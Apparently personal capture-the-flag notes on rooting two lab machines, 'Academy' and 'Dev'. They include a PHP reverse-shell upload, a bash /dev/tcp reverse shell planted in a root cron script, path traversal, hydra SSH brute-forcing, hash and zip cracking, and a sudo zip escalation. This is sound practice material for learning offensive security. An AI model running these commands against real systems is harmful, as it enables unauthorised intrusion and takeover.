# Academy - 192.168.176.132

nmap
21,80

└─$ gobuster dir --url http://192.168.176.132  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
OR  
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ  -u http://192.168.176.132/FUZZ  


found anonymous login FTP server, on port 21  
Downloaded note.txt.. got username/and password  
password was : cd73502828457d15655bbd7a63fb0bc8  looks like a hash  
hash-identifier cd73502828457d15655bbd7a63fb0bc8  (lists as md5)
Cracked with : https://crackstation.net/  
password == student  

Logged into student portal with information from note.txt, 
Successfully logged in as http://192.168.176.132/academy/
credentials : 10201321 : student  

Abused profile picture section, allowed to upload any file  
created payload with /usr/share/webshells/php/php-reverse-shell.php  
updated profile picture @ http://192.168.176.132/academy/my-profile.php  
Browsed to profile, clicked profile pick, and reverse-shell connected    

Logged in as user : ***WWW-DATA***  

cat /etc/crontab  
found a script running every minute, /home/grimmie/backup.sh  
$ cat /etc/passwd | grep home  
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash  

loaded linpeas.sh onto the server  
started python simple http server, hosting linpeas.sh  
python3 -m http.server  
downloaded file from target   
wget http://192.168.176.128:8000/linpeas.sh  
chmod +x linpeas.sh  
linpeas.sh  

identified password : 
╔══════════╣ Searching passwords in config PHP files
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";  
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";  
tried SSH with grimmie user and new pass  
ssh grimmie@192.168.176.132  
password = "My_V3ryS3cur3_P4ss"  

Logged in..  
updated backup.sh with following :   
bash -i >& /dev/tcp/192.168.176.128/8888 0>&1  

## *reverse shell as root!  Success!!!*

# Dev - 192.168.176.133

```
$ sudo nmap -A -p- 192.168.176.133   

22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))

gobuster dir --url http://192.168.176.133  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   
                                                                            
gobuster dir --url http://192.168.176.133:8080  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
http://192.168.176.133:8080/dev/  - Boltwire website
```

find CSSV 
Must register as a bolt user.
Once registered, we can add the following in the URL to retrieve files from server : 

https://www.exploit-db.com/exploits/48411

http://192.168.176.133:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd


jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash

hydra -l jeanpaul -P /usr/share/wordlists/metasploit/unix_passwords.txt  ssh://192.168.176.133:22 -t 4 -V  [[HYDRA]]

https://github.com/Cyber-Wo0dy/CVE-2023-46501
http://192.168.176.133:8080/dev/index.php?p=member.admin&action=data


password of bolt admin:  I_love_java

### checking NFS share/mount  
```└─$ showmount -e 192.168.176.133
Export list for 192.168.176.133:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
mkdir /tmp/mount
sudo mount -t nfs 192.168.176.133:/srv/nfs /tmp/mount 
```
[[NFS]]
found a file: save.zip
copied to local box
tried to unzip, but needs a password
crack with JOHN

```zip2john save.zip > zip.hash
john zip.hash   
java101          (save.zip)    

ssh jeanpaul@192.168.176.133 -i id_rsa
```
bad permissions..  
chmod 600 id_rsa  
now the login works..  

sudo -l  
lists /usr/bin/zip  

from GTFO ; 

```TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF```

From <https://gtfobins.github.io/gtfobins/zip/#sudo>   


# cat flag.txt
Congratz on rooting this box !